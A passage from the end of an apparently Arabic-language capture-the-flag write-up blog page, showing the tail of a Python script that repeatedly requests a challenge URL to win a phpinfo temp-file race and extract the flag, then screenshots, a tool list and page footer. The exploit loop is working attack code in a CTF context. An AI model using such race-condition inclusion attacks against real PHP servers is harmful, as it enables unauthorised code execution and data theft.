        tmp_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://eagle-jump.eagle-jump.org/?KEY=1de81526d511622e0a3cde89de0d3814&amp;p=&#34;</span> <span style="color:#f92672">+</span> tmp_name
        r <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>get(tmp_url, headers<span style="color:#f92672">=</span>gen_headers)<span style="color:#75715e">#</span>
        content <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>content
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;AbracadabrA&#39;</span> <span style="color:#f92672">in</span> content:
            got <span style="color:#f92672">=</span> content<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;AbracadabrA&#34;</span>)[<span style="color:#ae81ff">1</span>]
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;wait ... &#39;</span>)

    <span style="color:#66d9ef">return</span> got
        
<span style="color:#66d9ef">while</span> True:
    <span style="color:#66d9ef">print</span>(phpinfo_request()) 
</code></pre></div><!-- raw HTML omitted -->
<p>بعد بضع محاولات</p>
<p><img src="/images/2020-06-07_093959.png" alt="Images"></p>
<p>نرى</p>
<p><img src="/images/2020-06-07_094136.png" alt="Images"></p>
<p>الان نرى الجز الثاني من flag</p>
<p><img src="/images/2020-06-07_094203.png" alt="Images">
<img src="/images/2020-06-07_094256.png" alt="Images"></p>
<p>الان انهينا</p>
<!-- raw HTML omitted -->
<p>well i think writing in arabic harder</p>
<p>stuff used :</p>
<p>#fiddler
#python
#sublime text
#xshell
#chrome</p>

    </div>
    <div class="post-footer">
      <div class="info">
        
        
      </div>
    </div>

    
           
    
</div>


                </div>
            </div>
        </div>
</body>



<script type="text/javascript" src="https://example.com/js/jquery.min.86b1e8f819ee2d9099a783e50b49dff24282545fc40773861f9126b921532e4c.js" integrity="sha256-hrHo&#43;BnuLZCZp4PlC0nf8kKCVF/EB3OGH5EmuSFTLkw=" crossorigin="anonymous"></script>




<script type="text/javascript" src="https://example.com/js/bundle.min.0f9c74cb78f13d1f15f33daff4037c70354f98acfbb97a6f61708966675c3cae.js" integrity="sha256-D5x0y3jxPR8V8z2v9AN8cDVPmKz7uXpvYXCJZmdcPK4=" crossorigin="anonymous"></script>

<script type="text/javascript" src="https://example.com/js/medium-zoom.min.92f21c856129f84aeb719459b3e6ac621a3032fd7b180a18c04e1d12083f8aba.js" integrity="sha256-kvIchWEp&#43;ErrcZRZs&#43;asYhowMv17GAoYwE4dEgg/iro=" crossorigin="anonymous"></script></html></body>

</html>
